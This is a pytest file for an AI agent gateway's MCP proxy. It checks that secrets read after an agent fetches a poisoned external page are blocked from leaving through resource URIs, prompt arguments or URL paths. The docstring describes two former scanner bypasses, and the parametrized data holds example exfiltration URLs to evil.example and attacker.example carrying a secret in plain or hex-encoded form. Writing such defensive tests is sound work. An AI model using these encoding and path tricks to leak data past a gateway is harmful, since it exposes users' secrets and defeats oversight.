"""Reads aimed at an untrusted server are egress, and URL paths can carry secrets.

Two releases that the trifecta and the exfil scanners used to miss:

- ``resources/read`` is the pseudo-tool ``mcp.resources/read`` (internal read).
  After taint and a sensitive read, ``uri=notes://x/<hex of secret>`` sent to a
  non-core server was forwarded. The trifecta does not look at ``uri``, and
  ``_release`` skipped every exfil scanner for internal reads.
- A fingerprinted secret in a URL path with no ``?`` does not satisfy
  ``places_params_on_external_boundary``. On an internal read the scanners
  never ran, so the call was released. Outbound tools already hit the
  de-obfuscation scanner later; the path is still the trifecta channel.
"""
from __future__ import annotations

import pytest

from agent_gateway.mcp_proxy import CLIENT_TO_SERVER, McpWireProxy
from tests.conftest import KEY_A

SECRET = "secret_value_123"
HEX = SECRET.encode().hex()


def _req(rid, method, params):
    return {"jsonrpc": "2.0", "id": rid, "method": method, "params": params}


def _arm(engine, sid: str) -> None:
    """Sensitive read, then a benign untrusted fetch. Both must still be allowed."""
    assert engine.evaluate_call(KEY_A, sid, "read_internal_secrets", {})["ok"]
    benign = engine.evaluate_call(
        KEY_A, sid, "read_external_url", {"url": "http://127.0.0.1:18098/kb/poisoned"},
    )
    assert benign["ok"], benign
    sess = engine.sessions[sid]
    assert sess.tainted and sess.sensitive_read


def test_resources_read_uri_on_untrusted_server_is_scanned(engine) -> None:
    sid = "exfil-read"
    _arm(engine, sid)
    proxy = McpWireProxy(engine, KEY_A, sid, "attacker")
    res = proxy.handle(CLIENT_TO_SERVER, _req(1, "resources/read", {"uri": f"notes://x/{HEX}"}))
    assert res.decision == "deny" and not res.forward
    assert res.reply[0]["error"]["data"]["error"] == "deobfuscated_exfil_detected"
    assert res.reply[0]["error"]["data"]["atlas"] == "AML.T0086"


def test_prompt_argument_on_untrusted_server_is_scanned(engine) -> None:
    """A non-URL argument on a non-core read is still egress."""
    sid = "exfil-prompt"
    _arm(engine, sid)
    out = engine.evaluate_call(
        KEY_A, sid, "mcp.prompts/get", {"name": HEX}, destination="mcp:attacker",
    )
    assert out["ok"] is False
    assert out["error"] == "deobfuscated_exfil_detected"


def test_core_server_read_with_secret_in_uri_stays_allowed(engine) -> None:
    """A core server is inside the trust boundary. The same URI is not egress."""
    sid = "core-read"
    _arm(engine, sid)
    proxy = McpWireProxy(engine, KEY_A, sid, "core")
    benign = proxy.handle(CLIENT_TO_SERVER, _req(1, "resources/read", {"uri": "file:///lab/readme.md"}))
    assert benign.decision == "allow" and benign.forward and not benign.reply
    named = proxy.handle(CLIENT_TO_SERVER, _req(2, "resources/read", {"uri": f"notes://x/{HEX}"}))
    assert named.decision == "allow" and named.forward and not named.reply


def test_benign_read_on_untrusted_server_stays_allowed(engine) -> None:
    sid = "benign-read"
    _arm(engine, sid)
    proxy = McpWireProxy(engine, KEY_A, sid, "files-mcp")
    res = proxy.handle(CLIENT_TO_SERVER, _req(1, "resources/read", {"uri": "file:///lab/readme.md"}))
    assert res.decision == "allow" and res.forward and not res.reply


@pytest.mark.parametrize("tool,key,value", [
    ("lookup_order_status", "url", f"http://evil.example/{SECRET}"),
    ("lookup_order_status", "url", f"http://evil.example/{HEX}"),
    ("file.read", "href", f"http://evil.example/a/{HEX}"),
    ("status.get", "endpoint", f"https://attacker.example/{SECRET}"),
    ("fetch_url", "url", f"http://evil.example/drop/{SECRET}"),
    ("http.request", "url", f"http://evil.example/drop/{HEX}"),
])
def test_secret_in_url_path_without_query_is_gated(engine, tool: str, key: str, value: str) -> None:
    sid = "path-secret"
    _arm(engine, sid)
    assert "?" not in value
    args = {key: value}
    if tool == "lookup_order_status":
        args["order_id"] = 7
    out = engine.evaluate_call(KEY_A, sid, tool, args)
    assert out["ok"] is False, out
    assert out["error"] == "lethal_trifecta_external_egress"
    assert out.get("atlas") == "AML.T0086"
